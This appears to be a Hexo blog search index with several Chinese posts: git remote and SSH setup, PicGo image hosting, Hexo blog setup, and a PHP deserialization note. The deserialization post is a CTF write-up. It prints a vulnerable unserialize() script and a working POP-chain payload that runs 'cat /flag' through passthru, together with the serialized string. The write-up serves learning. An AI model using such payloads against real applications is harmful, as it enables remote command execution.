href="mailto:&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#x65;&#101;&#46;&#x63;&#111;&#109;">&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#x65;&#101;&#46;&#x63;&#111;&#109;</a></strong>验证<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170434757.png" alt="image-20240125170434757"></p></li></ol><h3 id="远程仓库操作"><a href="#远程仓库操作" class="headerlink" title="远程仓库操作"></a>远程仓库操作</h3><p><strong>添加远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git remote add &lt;起的名字&gt; &lt;仓库地址&gt;<br>//git remote 可以查看当前的远程仓库<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125174304783.png" alt="image-20240125174304783"></p><p><strong>推送远程仓库</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git push &lt;自己命名的名称&gt; &lt;分支&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125180131766.png" alt="image-20240125180131766"></p><p>这是远程推送的完整指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git push [-f] [--set-upstream] [远端名称 [本地分支名]:[远端分支名]]#如果本地和远端分支名一致就可以省略一个，像上面一样<br></code></pre></td></tr></table></figure><ul><li><p>-f表示强制推送，和远端代码修改同一块地方时可能会出现冲突。</p></li><li><p>–set-upstream：推送到远端的同时并且建立和远端分支的关联关系，这样当当前分支已经和远端分支关联时，则可以省略分支名和远端名<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125182248016.png" alt="image-20240125182248016"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125183254456.png" alt="image-20240125183254456"></p></li></ul><p><strong>克隆远程仓库</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git clone &lt;仓库路径&gt; [本地目录]<br></code></pre></td></tr></table></figure><p>如果没有指定目录的话，就会创建一个默认目录，比如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">git@gitee.com:ljc0033/git_test.git<br></code></pre></td></tr></table></figure><p>就会取git_test作为目录名</p><p><strong>抓取和拉取</strong></p><ul><li><p>抓取指令：git fetch [remote name] [branch name]</p><p>抓取就是将仓库里的更新都抓取到本地，不会进行合并</p><p>如果不指定远端名称和分支名，则抓取所有分支</p></li><li><p>拉取命令：git pull [remote name] [branch name]</p><p>拉取就是将远端仓库的修改拉到本地并自动进行合并，等同于fetch+merge</p><p>如果不指定远端名称和分支名，则抓取所有并更新当前分支</p></li></ul><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125213127428.png" alt="image-20240125213127428"></p><p>这里可以看到fetch之后的分支并没有合并到当前的master，接下来再进行 git merge origin&#x2F;master<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125213243273.png" alt="image-20240125213243273"></p><p>可以看到成功合并了(这里可以写上分支名)，git pull就相当于合并了这两步</p><h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当A和B修改同一个文件时会出现冲突，这里模拟一下同时修改file01.txt文件，其中一个先提交<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125214924391.png" alt="image-20240125214924391"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215448663.png" alt="image-20240125215448663"></p><p>这里可以看到右边想要进行合并出现了冲突，因为修改了同一块地方，再看一下file01.txt的内容<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215616774.png" alt="image-20240125215616774"></p><p>上面的是我们当前分支，下面的是远端分支，我们只需要在本地把他修改我们想要的样子然后提交再合并就可以了，比如这样<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215801079.png" alt="image-20240125215801079"></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125215928798.png" alt="image-20240125215928798"></p><h2 id="git绑定GitHub账号"><a href="#git绑定GitHub账号" class="headerlink" title="git绑定GitHub账号"></a>git绑定GitHub账号</h2><ol><li><pre><code>git config --global --list  //查看自己的用户名和邮箱，注意要和github保持一致//如果不一致则自己去设置<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br>2. ```<br>   ssh-keygen -t rsa -C &quot;自己的邮箱&quot;//这里生成ssh的密钥，会默认在~/.ssh目录下面<br></code></pre></td></tr></table></figure>可以看到有下列文件：![image-20231103174934422](https://gitee.com/ljc0033/magic/raw/master/image-20231103174934422.png)</code></pre></li><li><p>回到github仓库添加密钥</p></li></ol><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20231103175102389.png" alt="image-20231103175102389"></p><p>然后复制.ssh下面的.pub公钥到下面的key中<img src="https://gitee.com/ljc0033/magic/raw/master/image-20231103175214763.png" alt="image-20231103175214763"></p><ol start="4"><li><pre><code>ssh -T git@github.com //测试是否连通</code></pre><p>出现下面的结果即代表成功<img src="https://gitee.com/ljc0033/magic/raw/master/image-20231103175607799.png" alt="image-20231103175607799"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>记录一下反序列化相关的函数</p><p>这篇文章蛮好的：<a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的） | spaceman’blog (gitee.io)</a></p><p><strong>常见的魔术方法</strong></p><ul><li><p>__construct() :当对象被创建时触发</p></li><li><p>__destruct() :当对象被销毁时触发</p></li><li><p>__toString() :当对象被当作一个字符串使用时触发</p></li><li><p>__sleep() :序列化对象前调用（其返回需要是一个数组）</p></li><li><p>__wakeup() :反序列化恢复对象前调用，当字符串表示的对象属性个数大于真实个数时会跳过该函数执行</p></li><li><p>__call() :当调用对象不存在的方法时自动调用</p></li><li><p>__get() :从不可访问的属性读取数据时调用,或者不存在的属性</p></li><li><p>__invoke() :把一个实例对象当作函数使用时被调用</p></li><li><p>__clone() : 进行对象clone时被调用，用来调整对象的克隆行为</p></li><li><p>__callStatic() :调用不可访问或不存在的静态方法时自动调用</p></li><li><p>__isset() :在不可访问的属性上调用 isset() 或 empty() 时触发</p></li><li><p>__set() :当给不可访问或不存在属性赋值时被调用</p></li><li><p>__unset() :在不可访问的属性上使用 unset() 时触发</p></li><li><p>__ set_state() :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">当调用 var_export() 导出类时，此静态方法被调用。用 __set_state() 的返回值做为 var_export() 的返回值<br></code></pre></td></tr></table></figure></li><li><p>__debuginfo() :当调用 var_dump() 打印对象时被调用（当你不想打印所有属性），适用于PHP5.6版本</p></li></ul><p><strong>php代码执行有关的函数</strong></p><ul><li><p>eval()函数：会将字符串当作php代码执行，需要以分号结尾，但比较特殊的是它不能被当作变量执行，例如：$a(“phpinfo();”),a为’eval’；这样子会报函数未定义的错误。</p><p>这里去了解一下发现：eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。</p><blockquote><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。<br>可变函数不能用于例如：echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p></blockquote></li><li><p>assert()函数：也是将字符串当作php代码执行，不需要以分号结尾，但在php7.1版本后就默认不再可以执行代码了</p></li></ul><p><strong>命令执行相关函数</strong></p><ul><li>system()函数：将字符串作为OS命令执行，自带输出功能。</li><li>passthru()函数：将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li><li>exec()函数：将字符串作为OS命令执行，需要输出执行结果，比如使用echo将他打印出来，且它只会输出最后一行的内容。</li><li>shell_exec()：将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</li><li>反引号&#96;&#96;：里面的代码也会当作OS命令执行，需要输出执行结果。</li><li>popen()&#x2F;proc_open()函数：该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</li></ul><p><code>以GeekGame的一题为例来进行学习：</code></p><h1 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h1><p>题目的源码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以分析知道有三个魔术方法，分别是：**__destruct()<strong>,</strong>__invoke()<strong>,</strong>__get()**。</p><p>最终我们是要进入$eva1 里面进行命令执行，所以先给eva1和interesting变量进行赋值，注意不能赋值eval，因为eval不能动态调用，然后这是要进入到**__get()<strong>方法中才能进行命令执行，再网上看能看到lover类里面返回了变量，即我们可以通过这里访问web的实例对象不存在的属性从而触发</strong>__get()<strong>方法，看到最后访问的是QW变量，那只要设置一个web对象中不存在的属性即可；要访问该属性，我们又要触发</strong>__invoke()<strong>方法，看到有syc的</strong>__destruct()**方法返回了一个变量当作函数，那我们给这个变量传入lover对象即可；</p><p>所以调用链为这样：**__destruct()<strong>&#x3D;&gt;</strong>__invoke()<strong>&#x3D;&gt;</strong>__get()**</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;passthru&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置GitHub图床</title>
      <link href="/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/"/>
      <url>/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="采用PicGo来配置GitHub图床"><a href="#采用PicGo来配置GitHub图床" class="headerlink" title="采用PicGo来配置GitHub图床"></a>采用PicGo来配置GitHub图床</h1><p>转到picgo的GitHub图床设置来看配置信息：</p><ol><li>我们新建一个仓库来存放图片，比如我开了一个image的仓库，那格式就为&lt;github用户名&gt;&#x2F;image</li><li>分支名以前默认是master，现在是main，如果不创建其他分支填main就好</li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/picgo2.png" alt="picgo2"></p><ol start="3"><li>token是最重要的一步，用来识别你的身份，创建token的时候一定要勾选repo选项不然会上传失败，报各种权限不足。。。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/picgo1.png" alt="picgo1"></p><ol start="4"><li>最后在图床上面上传一张图片看是否能成功</li></ol><p>如果要和typora一起用直接在偏好设置中设置使用picgo上传即可。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20231103224740889.png" alt="image-20231103224740889"></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo blog 搭建</title>
      <link href="/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/"/>
      <url>/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/</url>
      
        <content type="html"><![CDATA[<p>这篇文章记录一下blog的搭建</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ol><li>github账号</li><li>安装git</li><li>安装nodejs</li></ol><p>这些安装找个教程即可</p><h2 id="npm修改全局包位置"><a href="#npm修改全局包位置" class="headerlink" title="npm修改全局包位置"></a>npm修改全局包位置</h2><p>这里是为了不占用c盘的空间，npm安装的包默认在c盘</p><p>这里了解了几个命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm root -g           // 查看全局包的安装目录<br>npm list -g --depth 0 // 查看全局安装过的包<br></code></pre></td></tr></table></figure><blockquote><p>npm list命令可能会报错，这时候更新一下npm就可以了</p><p>npm update -g –verbose</p></blockquote><p>npm安装分为两类：全局包和项目包</p><p>全局安装: 包被安装到了系统目录（一般在系统盘的node_modules中）。</p><ul><li>命令：<code>npm install -g 包名</code> 或者 <code>npm install 包名 -g</code></li></ul><p>项目安装（或者叫本地安装)，包安装在当前项目的根目录下（与package.json同级）的node_modules中。</p><ul><li>命令：<code>npm install 包名</code></li></ul><p>步骤：</p><ol><li><p>在要安装依赖的目录下新建两个文件夹</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/1.png"></p><ol start="2"><li><p>在cmd中执行下面两条指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm config set prefix&quot;nodeglobal路径&quot;<br>npm config set cache &quot;node_cache路径&quot;<br></code></pre></td></tr></table></figure><p>这两条命令修改了存放路径，但是还要修改环境变量系统才知道</p></li><li><p>系统变量添加NODE_PATH，路径为node_global下的node_modules；用户变量的路径中添加node_global的路径即可<img src="https://raw.githubusercontent.com/clowsman/image/main/8.png" alt="8"></p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/2.png" alt="2"></p></li><li><p>用npm root -g 命令查看一下是否成功了<img src="https://raw.githubusercontent.com/clowsman/image/main/3.png"></p></li></ol></li></ol><h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>这里搜搜教程就好了。</p><h1 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h1><p>去hexo的官网会有安装命令，如下按顺序执行：</p><blockquote><p>在此之前先新建文件夹在我们要的博客目录下，在该目录打开git bash<img src="https://raw.githubusercontent.com/clowsman/image/main/4.png"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm install hexo-cli -g<br>hexo init blog<br>cd blog<br>npm install<br>hexo server //也可以缩写成hexo s<br></code></pre></td></tr></table></figure><blockquote><p>所有操作在git控制台操作就好，不需要Windows的控制台，因为会装到上面这是全局包那里的目录</p></blockquote><p>输入第五行命令之后就可以看到博客地址：</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/7.png"></p><p>进行网页之后会给我们一些命令提示：</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/5.png"></p><h1 id="日常操作使用"><a href="#日常操作使用" class="headerlink" title="日常操作使用"></a>日常操作使用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo new &lt;文章标题&gt;<br></code></pre></td></tr></table></figure><p>创建一篇新文章，可以在source&#x2F;_posts文件夹中看到文章的文件，是md文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo generate//也可以写成 hexo g<br></code></pre></td></tr></table></figure><p>用于生成静态网页，在更改博客后可以使用该命令，但刷新一下网页其实也可以</p><h1 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h1><p>我们可以去hexo官网点击下面的探索主题找自己想要的主题;选好之后就会跳到主题的github网页，里面有详细说明可以自己看</p><h1 id="发布到github-pages"><a href="#发布到github-pages" class="headerlink" title="发布到github pages"></a>发布到github pages</h1><p>安装hexo-deployer-git</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>然后我们需要去修改_config.yml下的文件的deploy选项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deploy:<br>  type: git<br>  repo: https://github.com/clowsman/clowsman.github.io.git<br>  branch: main<br>  token: <br></code></pre></td></tr></table></figure><blockquote><p>注意冒号后一定要空格</p></blockquote><p>但是上面使用token的方式我的会报错，可能是repo地址的问题，所以改成ssh的方式来试一试，ssh就可以不要token了</p><p><img src="https://raw.githubusercontent.com/clowsman/image/main/6.png"></p><p>复制该ssh地址即可</p><blockquote><p>使用之前记得将git绑定ssh</p></blockquote><h1 id="文章头部的一些关键字"><a href="#文章头部的一些关键字" class="headerlink" title="文章头部的一些关键字"></a>文章头部的一些关键字</h1><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>layout</code></td><td align="left">布局</td><td align="left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td></tr><tr><td align="left"><code>title</code></td><td align="left">标题</td><td align="left">文章的文件名</td></tr><tr><td align="left"><code>date</code></td><td align="left">建立日期</td><td align="left">文件建立日期</td></tr><tr><td align="left"><code>updated</code></td><td align="left">更新日期</td><td align="left">文件更新日期</td></tr><tr><td align="left"><code>comments</code></td><td align="left">开启文章的评论功能</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>tags</code></td><td align="left">标签（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>categories</code></td><td align="left">分类（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">覆盖文章的永久链接，永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td><td align="left"><code>null</code></td></tr><tr><td align="left"><code>excerpt</code></td><td align="left">纯文本的页面摘要。使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a> 来格式化文本</td><td align="left"></td></tr><tr><td align="left"><code>disableNunjucks</code></td><td align="left">启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> 和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a> 的渲染功能</td><td align="left">false</td></tr><tr><td align="left"><code>lang</code></td><td align="left">设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td align="left">继承自 <code>_config.yml</code></td></tr><tr><td align="left"><code>published</code></td><td align="left">文章是否发布</td><td align="left">对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>